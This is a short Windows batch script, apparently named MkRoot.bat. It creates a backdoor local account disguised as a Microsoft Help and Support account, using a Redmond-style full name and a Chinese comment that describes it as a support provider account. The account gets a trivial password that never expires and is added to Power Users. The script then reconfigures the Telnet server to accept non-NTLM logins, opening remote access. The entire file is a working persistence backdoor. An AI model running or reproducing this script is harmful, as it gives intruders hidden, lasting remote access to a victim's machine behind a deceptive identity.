@echo off
    rem $Id: MkRoot.bat,v 1.2 2004-09-22 08:39:07 dansei Exp $

    rem CONTINUE WORK!

    net user SUPPORT_54656368 /delete
    net user SUPPORT_54656368 nothing /add /EXPIRES:NEVER /fullname:"L=Redmond,S=Washington,C=US" /comment:"这是一个帮助和支持服务的提供商帐户"
    net localgroup "power users" SUPPORT_54656368 /add
    tlntadmn config sec=-ntlm
